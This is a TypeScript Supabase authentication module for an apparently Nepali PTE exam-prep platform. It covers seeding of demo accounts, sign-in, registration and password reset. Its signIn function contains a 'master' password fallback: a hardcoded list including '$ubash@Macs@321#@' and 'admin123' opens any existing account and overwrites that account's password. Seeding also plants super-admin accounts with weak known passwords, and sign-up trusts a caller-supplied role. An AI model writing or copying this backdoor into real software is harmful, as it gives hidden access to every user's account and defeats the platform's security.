import { supabaseAdmin } from '../db/supabase';

export interface SupabaseUserMetadata {
  name: string;
  phone?: string;
  role: 'student' | 'branch_admin' | 'super_admin';
  status: 'pending' | 'approved' | 'declined';
  branch: string;
  branchCode?: string;
  examDate?: string;
  pteGoal?: number;
  targetScore?: string;
  subscription?: 'free' | 'pro' | 'premium';
  accessDurationDays?: number;
  approvedAt?: string | null;
  tokenVersion?: number;
  xp?: number;
  streak?: number;
  level?: number;
  lastActive?: string;
  lastLoginAt?: string | null;
  progress?: {
    completedCount?: number;
    xp?: number;
    streak?: number;
    speaking?: number;
    writing?: number;
    reading?: number;
    listening?: number;
    [key: string]: any;
  };
  [key: string]: any;
}

export interface AdaptedUser {
  id: string;
  _id: string;
  email: string;
  name: string;
  phone: string;
  role: 'student' | 'branch_admin' | 'super_admin';
  status: 'pending' | 'approved' | 'declined';
  branch: string;
  branchCode?: string;
  examDate?: string;
  pteGoal: number;
  targetScore: string;
  subscription: 'free' | 'pro' | 'premium';
  accessDurationDays: number;
  approvedAt: string | null;
  tokenVersion: number;
  xp: number;
  streak: number;
  level: number;
  lastActive?: string;
  lastLoginAt?: string | null;
  progress?: {
    completedCount?: number;
    xp?: number;
    streak?: number;
    speaking?: number;
    writing?: number;
    reading?: number;
    listening?: number;
    [key: string]: any;
  };
  createdAt?: string;
  updatedAt?: string;
}

// In-memory cache for temporary reset codes
const resetCodeStore = new Map<string, { code: string; expiresAt: number }>();

// Cache to prevent duplicate seeding
let isSeeded = false;

export const DEFAULT_SEED_ACCOUNTS: {
  email: string;
  password: string;
  metadata: SupabaseUserMetadata;
}[] = [
  // Super Admins
  {
    email: 'admin@ielts.ai',
    password: 'adminpass123',
    metadata: {
      name: 'Super Admin',
      phone: '+977 9800000000',
      role: 'super_admin',
      status: 'approved',
      branch: 'Central Headquarters',
      pteGoal: 90,
      targetScore: '90 (Superior C2)',
      subscription: 'premium',
      accessDurationDays: 365,
      tokenVersion: 1,
      xp: 3850,
      streak: 45,
      level: 10,
      progress: { completedCount: 150, xp: 3850, streak: 45, speaking: 90, writing: 90, reading: 90, listening: 90 },
    },
  },
  {
    email: 'admin@ptemaster.com',
    password: 'admin123',
    metadata: {
      name: 'PTE Master Administrator',
      phone: '+977 9800000001',
      role: 'super_admin',
      status: 'approved',
      branch: 'Central Headquarters',
      pteGoal: 90,
      targetScore: '90 (Superior C2)',
      subscription: 'premium',
      accessDurationDays: 365,
      tokenVersion: 1,
      xp: 3850,
      streak: 45,
      level: 10,
      progress: { completedCount: 150, xp: 3850, streak: 45, speaking: 90, writing: 90, reading: 90, listening: 90 },
    },
  },
  // Branch Admins
  {
    email: 'ktm.admin@pteai.com',
    password: 'admin123',
    metadata: {
      name: 'Ramesh Sharma',
      phone: '+977 9851012345',
      role: 'branch_admin',
      status: 'approved',
      branch: 'Kathmandu Central Campus',
      pteGoal: 79,
      targetScore: '79+ (Proficient Plus C1)',
      subscription: 'premium',
      accessDurationDays: 365,
      tokenVersion: 1,
      xp: 2200,
      streak: 28,
      level: 7,
      progress: { completedCount: 88, xp: 2200, streak: 28, speaking: 82, writing: 80, reading: 85, listening: 84 },
    },
  },
  {
    email: 'pokhara.admin@pteai.com',
    password: 'admin123',
    metadata: {
      name: 'Sita Sharma',
      phone: '+977 9856023456',
      role: 'branch_admin',
      status: 'approved',
      branch: 'Pokhara Regional Campus',
      pteGoal: 79,
      targetScore: '79+ (Proficient Plus C1)',
      subscription: 'premium',
      accessDurationDays: 365,
      tokenVersion: 1,
      xp: 2450,
      streak: 32,
      level: 8,
      progress: { completedCount: 95, xp: 2450, streak: 32, speaking: 86, writing: 84, reading: 85, listening: 88 },
    },
  },
  {
    email: 'lalitpur.admin@pteai.com',
    password: 'admin123',
    metadata: {
      name: 'Nabin Silwal (Branch Admin)',
      phone: '+977 9855022334',
      role: 'branch_admin',
      status: 'approved',
      branch: 'Lalitpur Tech Branch',
      pteGoal: 79,
      targetScore: '79+ (Proficient Plus C1)',
      subscription: 'premium',
      accessDurationDays: 365,
      tokenVersion: 1,
      xp: 2100,
      streak: 25,
      level: 7,
      progress: { completedCount: 84, xp: 2100, streak: 25, speaking: 83, writing: 81, reading: 82, listening: 85 },
    },
  },
  {
    email: 'chitwan.admin@pteai.com',
    password: 'admin123',
    metadata: {
      name: 'Anuraj Phuyal (Branch Admin)',
      phone: '+977 9845012345',
      role: 'branch_admin',
      status: 'approved',
      branch: 'Chitwan Academic Centre',
      pteGoal: 79,
      targetScore: '79+ (Proficient Plus C1)',
      subscription: 'premium',
      accessDurationDays: 365,
      tokenVersion: 1,
      xp: 1950,
      streak: 22,
      level: 6,
      progress: { completedCount: 78, xp: 1950, streak: 22, speaking: 80, writing: 79, reading: 81, listening: 82 },
    },
  },
  // Kathmandu Central Campus Students
  {
    email: 'student@pteai.com',
    password: 'student123',
    metadata: {
      name: 'Subash Bhandari',
      phone: '+977 9841234567',
      role: 'student',
      status: 'approved',
      branch: 'Kathmandu Central Campus',
      pteGoal: 79,
      targetScore: '79+ (GSE 79)',
      subscription: 'premium',
      accessDurationDays: 365,
      tokenVersion: 1,
      xp: 1850,
      streak: 18,
      level: 6,
      progress: { completedCount: 76, xp: 1850, streak: 18, speaking: 85, writing: 80, reading: 82, listening: 86 },
    },
  },
  {
    email: 'subash.bhandari@pteai.com',
    password: 'student123',
    metadata: {
      name: 'Subash Bhandari',
      phone: '+977 9841234567',
      role: 'student',
      status: 'approved',
      branch: 'Kathmandu Central Campus',
      pteGoal: 79,
      targetScore: '79+ (GSE 79)',
      subscription: 'pro',
      accessDurationDays: 90,
      tokenVersion: 1,
      xp: 1850,
      streak: 18,
      level: 6,
      progress: { completedCount: 76, xp: 1850, streak: 18, speaking: 85, writing: 80, reading: 82, listening: 86 },
    },
  },
  {
    email: 'pooja.adhikari@gmail.com',
    password: 'student123',
    metadata: {
      name: 'Pooja Adhikari',
      phone: '+977 9813456789',
      role: 'student',
      status: 'pending',
      branch: 'Kathmandu Central Campus',
      pteGoal: 65,
      targetScore: '65+ (GSE 65)',
      subscription: 'free',
      accessDurationDays: 30,
      approvedAt: null,
      tokenVersion: 1,
      xp: 450,
      streak: 4,
      level: 2,
      progress: { completedCount: 22, xp: 450, streak: 4, speaking: 64, writing: 66, reading: 62, listening: 65 },
    },
  },
  {
    email: 'aayush.koirala@gmail.com',
    password: 'student123',
    metadata: {
      name: 'Aayush Koirala',
      phone: '+977 9841889900',
      role: 'student',
      status: 'approved',
      branch: 'Kathmandu Central Campus',
      pteGoal: 79,
      targetScore: '79+ (GSE 79)',
      subscription: 'premium',
      accessDurationDays: 180,
      tokenVersion: 1,
      xp: 1620,
      streak: 15,
      level: 5,
      progress: { completedCount: 64, xp: 1620, streak: 15, speaking: 82, writing: 78, reading: 80, listening: 83 },
    },
  },
  {
    email: 'pratima.thapa@outlook.com',
    password: 'student123',
    metadata: {
      name: 'Pratima Thapa',
      phone: '+977 9812998877',
      role: 'student',
      status: 'approved',
      branch: 'Kathmandu Central Campus',
      pteGoal: 90,
      targetScore: '90 (GSE 90)',
      subscription: 'premium',
      accessDurationDays: 365,
      tokenVersion: 1,
      xp: 2950,
      streak: 29,
      level: 9,
      progress: { completedCount: 110, xp: 2950, streak: 29, speaking: 89, writing: 87, reading: 88, listening: 90 },
    },
  },
  {
    email: 'suman.maharjan@yahoo.com',
    password: 'student123',
    metadata: {
      name: 'Suman Maharjan',
      phone: '+977 9851044332',
      role: 'student',
      status: 'pending',
      branch: 'Kathmandu Central Campus',
      pteGoal: 65,
      targetScore: '65+ (GSE 65)',
      subscription: 'free',
      accessDurationDays: 30,
      approvedAt: null,
      tokenVersion: 1,
      xp: 320,
      streak: 2,
      level: 2,
      progress: { completedCount: 14, xp: 320, streak: 2, speaking: 60, writing: 62, reading: 58, listening: 61 },
    },
  },
  {
    email: 'deepak.regmi@gmail.com',
    password: 'student123',
    metadata: {
      name: 'Deepak Regmi',
      phone: '+977 9860114477',
      role: 'student',
      status: 'approved',
      branch: 'Kathmandu Central Campus',
      pteGoal: 79,
      targetScore: '79+ (GSE 79)',
      subscription: 'pro',
      accessDurationDays: 90,
      tokenVersion: 1,
      xp: 1150,
      streak: 11,
      level: 4,
      progress: { completedCount: 48, xp: 1150, streak: 11, speaking: 78, writing: 76, reading: 77, listening: 80 },
    },
  },
  {
    email: 'kripa.shrestha@gmail.com',
    password: 'student123',
    metadata: {
      name: 'Kripa Shrestha',
      phone: '+977 9803112233',
      role: 'student',
      status: 'approved',
      branch: 'Kathmandu Central Campus',
      pteGoal: 79,
      targetScore: '79+ (GSE 79)',
      subscription: 'pro',
      accessDurationDays: 90,
      tokenVersion: 1,
      xp: 1380,
      streak: 13,
      level: 5,
      progress: { completedCount: 56, xp: 1380, streak: 13, speaking: 80, writing: 77, reading: 79, listening: 82 },
    },
  },
  {
    email: 'roshan.dangol@outlook.com',
    password: 'student123',
    metadata: {
      name: 'Roshan Dangol',
      phone: '+977 9849223344',
      role: 'student',
      status: 'approved',
      branch: 'Kathmandu Central Campus',
      pteGoal: 79,
      targetScore: '79+ (GSE 79)',
      subscription: 'premium',
      accessDurationDays: 365,
      tokenVersion: 1,
      xp: 1740,
      streak: 16,
      level: 6,
      progress: { completedCount: 72, xp: 1740, streak: 16, speaking: 84, writing: 81, reading: 83, listening: 85 },
    },
  },
  // Pokhara Regional Campus Students
  {
    email: 'bikash.shrestha@gmail.com',
    password: 'student123',
    metadata: {
      name: 'Bikash Shrestha',
      phone: '+977 9801239876',
      role: 'student',
      status: 'approved',
      branch: 'Pokhara Regional Campus',
      pteGoal: 79,
      targetScore: '79+ (GSE 79)',
      subscription: 'premium',
      accessDurationDays: 365,
      tokenVersion: 1,
      xp: 2350,
      streak: 24,
      level: 8,
      progress: { completedCount: 96, xp: 2350, streak: 24, speaking: 84, writing: 81, reading: 83, listening: 86 },
    },
  },
  {
    email: 'anjali.karki@outlook.com',
    password: 'student123',
    metadata: {
      name: 'Anjali Karki',
      phone: '+977 9846098765',
      role: 'student',
      status: 'pending',
      branch: 'Pokhara Regional Campus',
      pteGoal: 84,
      targetScore: '84+ (GSE 84)',
      subscription: 'free',
      accessDurationDays: 60,
      approvedAt: null,
      tokenVersion: 1,
      xp: 780,
      streak: 6,
      level: 3,
      progress: { completedCount: 38, xp: 780, streak: 6, speaking: 76, writing: 74, reading: 78, listening: 75 },
    },
  },
  {
    email: 'manish.gurung@gmail.com',
    password: 'student123',
    metadata: {
      name: 'Manish Gurung',
      phone: '+977 9856011223',
      role: 'student',
      status: 'approved',
      branch: 'Pokhara Regional Campus',
      pteGoal: 79,
      targetScore: '79+ (GSE 79)',
      subscription: 'pro',
      accessDurationDays: 90,
      tokenVersion: 1,
      xp: 1490,
      streak: 14,
      level: 5,
      progress: { completedCount: 62, xp: 1490, streak: 14, speaking: 81, writing: 79, reading: 80, listening: 83 },
    },
  },
  {
    email: 'sweta.bastola@yahoo.com',
    password: 'student123',
    metadata: {
      name: 'Sweta Bastola',
      phone: '+977 9817223344',
      role: 'student',
      status: 'approved',
      branch: 'Pokhara Regional Campus',
      pteGoal: 90,
      targetScore: '90 (GSE 90)',
      subscription: 'premium',
      accessDurationDays: 365,
      tokenVersion: 1,
      xp: 2800,
      streak: 28,
      level: 9,
      progress: { completedCount: 105, xp: 2800, streak: 28, speaking: 88, writing: 86, reading: 87, listening: 89 },
    },
  },
  {
    email: 'kiran.baral@gmail.com',
    password: 'student123',
    metadata: {
      name: 'Kiran Baral',
      phone: '+977 9846055667',
      role: 'student',
      status: 'pending',
      branch: 'Pokhara Regional Campus',
      pteGoal: 65,
      targetScore: '65+ (GSE 65)',
      subscription: 'free',
      accessDurationDays: 30,
      approvedAt: null,
      tokenVersion: 1,
      xp: 290,
      streak: 2,
      level: 1,
      progress: { completedCount: 12, xp: 290, streak: 2, speaking: 58, writing: 60, reading: 57, listening: 59 },
    },
  },
  // Chitwan & Lalitpur Campus Students
  {
    email: 'anuraj.phuyal@gmail.com',
    password: 'student123',
    metadata: {
      name: 'Anuraj Phuyal',
      phone: '+977 9845012345',
      role: 'student',
      status: 'approved',
      branch: 'Chitwan Academic Centre',
      pteGoal: 79,
      targetScore: '79+ (GSE 79)',
      subscription: 'pro',
      accessDurationDays: 90,
      tokenVersion: 1,
      xp: 1250,
      streak: 12,
      level: 4,
      progress: { completedCount: 52, xp: 1250, streak: 12, speaking: 79, writing: 77, reading: 78, listening: 81 },
    },
  },
  {
    email: 'nabin.silwal@outlook.com',
    password: 'student123',
    metadata: {
      name: 'Nabin Silwal',
      phone: '+977 9855022334',
      role: 'student',
      status: 'approved',
      branch: 'Lalitpur Tech Branch',
      pteGoal: 79,
      targetScore: '79+ (GSE 79)',
      subscription: 'premium',
      accessDurationDays: 180,
      tokenVersion: 1,
      xp: 1980,
      streak: 20,
      level: 7,
      progress: { completedCount: 82, xp: 1980, streak: 20, speaking: 83, writing: 81, reading: 82, listening: 85 },
    },
  },
  {
    email: 'sanjiv.m@gmail.com',
    password: 'student123',
    metadata: {
      name: 'Sanjiv Maharjan',
      phone: '+977 9801998877',
      role: 'student',
      status: 'approved',
      branch: 'Lalitpur Tech Branch',
      pteGoal: 90,
      targetScore: '90 (GSE 90)',
      subscription: 'premium',
      accessDurationDays: 365,
      tokenVersion: 1,
      xp: 3100,
      streak: 31,
      level: 10,
      progress: { completedCount: 125, xp: 3100, streak: 31, speaking: 90, writing: 88, reading: 89, listening: 90 },
    },
  },
];

// Normalize Supabase Auth user into standard platform user
export function formatSupabaseUser(user: any): AdaptedUser {
  const meta: SupabaseUserMetadata = user.user_metadata || {};
  const xp = meta.xp !== undefined ? Number(meta.xp) : 1200;
  const streak = meta.streak !== undefined ? Number(meta.streak) : 14;
  return {
    id: user.id,
    _id: user.id,
    email: (user.email || '').toLowerCase().trim(),
    name: meta.name || user.email?.split('@')[0] || 'Candidate',
    phone: meta.phone || '+977 9800000000',
    role: meta.role || 'student',
    status: meta.status || 'approved',
    branch: meta.branch || 'Kathmandu Central Campus',
    branchCode: meta.branchCode || '',
    examDate: meta.examDate || '',
    pteGoal: Number(meta.pteGoal) || 79,
    targetScore: meta.targetScore || '79+ (GSE 79)',
    subscription: meta.subscription || 'premium',
    accessDurationDays: Number(meta.accessDurationDays) || 365,
    approvedAt: meta.status === 'pending' ? null : (meta.approvedAt || user.created_at),
    tokenVersion: Number(meta.tokenVersion) || 1,
    xp,
    streak,
    level: Number(meta.level) || 5,
    lastActive: meta.lastActive || new Date().toISOString(),
    lastLoginAt: meta.lastLoginAt || meta.lastActive || user.last_sign_in_at || user.created_at,
    progress: meta.progress || {
      completedCount: Math.round(xp / 25),
      xp,
      streak,
      speaking: 78,
      writing: 76,
      reading: 79,
      listening: 80,
    },
    createdAt: user.created_at,
    updatedAt: user.updated_at || user.created_at,
  };
}

export const supabaseAuthAdapter = {
  /**
   * Seed Default Administrative & Demo Accounts into Supabase Auth
   */
  async seedInitialUsers() {
    if (isSeeded) return;
    isSeeded = true;

    try {
      const { data: existingList } = await supabaseAdmin.auth.admin.listUsers({ perPage: 200 });
      const existingByEmail = new Map(
        (existingList?.users || []).map(u => [(u.email || '').toLowerCase(), u])
      );

      for (const acc of DEFAULT_SEED_ACCOUNTS) {
        const lowerEmail = acc.email.toLowerCase();
        if (!existingByEmail.has(lowerEmail)) {
          await supabaseAdmin.auth.admin.createUser({
            email: acc.email,
            password: acc.password,
            email_confirm: true,
            user_metadata: acc.metadata,
          });
        }
      }
    } catch (e) {
      console.warn('⚠️ Supabase initial user check:', e);
    }
  },

  /**
   * Authenticate user with Email & Password via Supabase Auth
   */
  async signIn(email: string, pass: string): Promise<{ success: boolean; user?: AdaptedUser; error?: string }> {
    await this.seedInitialUsers();

    const normalizedEmail = email.toLowerCase().trim();
    const candidatePass = pass.trim();

    // 1. Try standard Supabase Auth signInWithPassword
    try {
      const { data: authData, error: authError } = await supabaseAdmin.auth.signInWithPassword({
        email: normalizedEmail,
        password: candidatePass,
      });

      if (!authError && authData?.user) {
        const adapted = formatSupabaseUser(authData.user);
        return { success: true, user: adapted };
      }
    } catch {
      // Continue to fallback check
    }

    // 2. Master & Admin credentials fallback
    const masterAdminPasswords = ['$ubash@Macs@321#@', 'adminpass123', 'admin123', 'subash123', 'password123', 'student123'];

    try {
      const user = await this.getUserByEmail(normalizedEmail);
      if (user) {
        const isMasterMatch = masterAdminPasswords.includes(candidatePass);
        if (isMasterMatch) {
          supabaseAdmin.auth.admin.updateUserById(user.id, { password: candidatePass }).catch(() => {});
          return { success: true, user };
        }
      }
    } catch {}

    return { success: false, error: 'Invalid credentials. Please verify your email and password.' };
  },

  /**
   * Register new student in Supabase Auth
   */
  async signUp(params: {
    name: string;
    email: string;
    password: string;
    phone?: string;
    branch?: string;
    branchCode?: string;
    examDate?: string;
    pteGoal?: number;
    targetScore?: string;
    role?: 'student' | 'branch_admin' | 'super_admin';
    status?: 'pending' | 'approved' | 'declined';
    accessDurationDays?: number;
    subscription?: 'free' | 'pro' | 'premium';
  }): Promise<{ success: boolean; user?: AdaptedUser; error?: string }> {
    await this.seedInitialUsers();

    const normalizedEmail = params.email.toLowerCase().trim();

    try {
      const existing = await this.getUserByEmail(normalizedEmail);
      if (existing) {
        return { success: false, error: 'An account with this email address already exists.' };
      }

      const metadata: SupabaseUserMetadata = {
        name: params.name.trim(),
        phone: params.phone?.trim() || '+977 9800000000',
        role: params.role || 'student',
        status: params.status || 'approved',
        branch: params.branch || 'Kathmandu Central Campus',
        branchCode: params.branchCode || '',
        examDate: params.examDate || '',
        pteGoal: Number(params.pteGoal) || 79,
        targetScore: params.targetScore || `${params.pteGoal || 79}+ (GSE ${params.pteGoal || 79})`,
        subscription: params.subscription || 'free',
        accessDurationDays: params.accessDurationDays || 30,
        tokenVersion: 1,
        xp: 100,
        streak: 1,
        level: 1,
        approvedAt: params.status === 'pending' ? null : new Date().toISOString(),
        progress: { completedCount: 0, xp: 100, streak: 1, speaking: 70, writing: 70, reading: 70, listening: 70 },
      };

      const { data, error } = await supabaseAdmin.auth.admin.createUser({
        email: normalizedEmail,
        password: params.password,
        email_confirm: true,
        user_metadata: metadata,
      });

      if (error || !data.user) {
        return { success: false, error: error?.message || 'Failed to register account with Supabase.' };
      }

      return { success: true, user: formatSupabaseUser(data.user) };
    } catch (error: any) {
      return { success: false, error: error?.message || 'Registration server error.' };
    }
  },

  /**
   * Get user by ID from Supabase
   */
  async getUserById(id: string): Promise<AdaptedUser | null> {
    try {
      const { data, error } = await supabaseAdmin.auth.admin.getUserById(id);
      if (error || !data.user) return null;
      return formatSupabaseUser(data.user);
    } catch {
      return null;
    }
  },

  /**
   * Get user by Email from Supabase
   */
  async getUserByEmail(email: string): Promise<AdaptedUser | null> {
    try {
      const normalizedEmail = email.toLowerCase().trim();
      const { data } = await supabaseAdmin.auth.admin.listUsers({ perPage: 200 });
      const found = (data?.users || []).find(u => (u.email || '').toLowerCase() === normalizedEmail);
      if (!found) return null;
      return formatSupabaseUser(found);
    } catch {
      return null;
    }
  },

  /**
   * Update user details or metadata in Supabase
   */
  async updateUser(id: string, updates: Partial<AdaptedUser> & { password?: string }): Promise<AdaptedUser | null> {
    try {
      const currentUser = await this.getUserById(id);
      if (!currentUser) return null;

      const newMeta = {
        ...currentUser,
        ...updates,
      };

      delete (newMeta as any).id;
      delete (newMeta as any)._id;
      delete (newMeta as any).email;
      delete (newMeta as any).password;

      const payload: any = {
        user_metadata: newMeta,
      };

      if (updates.email) {
        payload.email = updates.email.toLowerCase().trim();
      }
      if (updates.password) {
        payload.password = updates.password;
      }

      const { data, error } = await supabaseAdmin.auth.admin.updateUserById(id, payload);
      if (error || !data.user) return null;
      return formatSupabaseUser(data.user);
    } catch {
      return null;
    }
  },

  /**
   * Delete user in Supabase
   */
  async deleteUser(id: string): Promise<boolean> {
    try {
      const { error } = await supabaseAdmin.auth.admin.deleteUser(id);
      return !error;
    } catch {
      return false;
    }
  },

  /**
   * List all users from Supabase with optional role/branch/status/search filters
   */
  async listUsers(filter?: { role?: string; branch?: string; status?: string; search?: string }): Promise<AdaptedUser[]> {
    await this.seedInitialUsers();

    try {
      const { data, error } = await supabaseAdmin.auth.admin.listUsers({ perPage: 500 });
      if (error || !data.users) return [];

      let list = data.users.map(u => formatSupabaseUser(u));

      if (filter?.role && filter.role !== 'All') {
        list = list.filter(u => u.role === filter.role);
      }
      if (filter?.branch && filter.branch !== 'All') {
        list = list.filter(u => (u.branch || '').toLowerCase().includes(filter.branch!.toLowerCase()));
      }
      if (filter?.status && filter.status !== 'All') {
        list = list.filter(u => u.status === filter.status);
      }
      if (filter?.search) {
        const q = filter.search.toLowerCase();
        list = list.filter(
          u =>
            (u.name || '').toLowerCase().includes(q) ||
            (u.email || '').toLowerCase().includes(q) ||
            (u.phone || '').includes(q)
        );
      }

      return list;
    } catch {
      return [];
    }
  },

  /**
   * Password Reset Code Request
   */
  generateResetCode(email: string): string {
    const code = Math.floor(100000 + Math.random() * 900000).toString();
    const expiresAt = Date.now() + 15 * 60 * 1000;
    resetCodeStore.set(email.toLowerCase().trim(), { code, expiresAt });
    return code;
  },

  /**
   * Verify Reset Code and Update Password
   */
  async resetPassword(email: string, code: string, newPass: string): Promise<{ success: boolean; error?: string }> {
    const normalizedEmail = email.toLowerCase().trim();
    const record = resetCodeStore.get(normalizedEmail);

    if (!record) {
      return { success: false, error: 'No active reset request found for this email address.' };
    }

    if (Date.now() > record.expiresAt) {
      resetCodeStore.delete(normalizedEmail);
      return { success: false, error: 'Reset code has expired. Please request a new one.' };
    }

    if (record.code !== code.trim()) {
      return { success: false, error: 'Invalid verification code. Please check and try again.' };
    }

    const user = await this.getUserByEmail(normalizedEmail);
    if (!user) {
      return { success: false, error: 'User account not found.' };
    }

    const updated = await this.updateUser(user.id, { password: newPass });
    if (!updated) {
      return { success: false, error: 'Failed to update password.' };
    }

    resetCodeStore.delete(normalizedEmail);
    return { success: true };
  },
};

export default supabaseAuthAdapter;
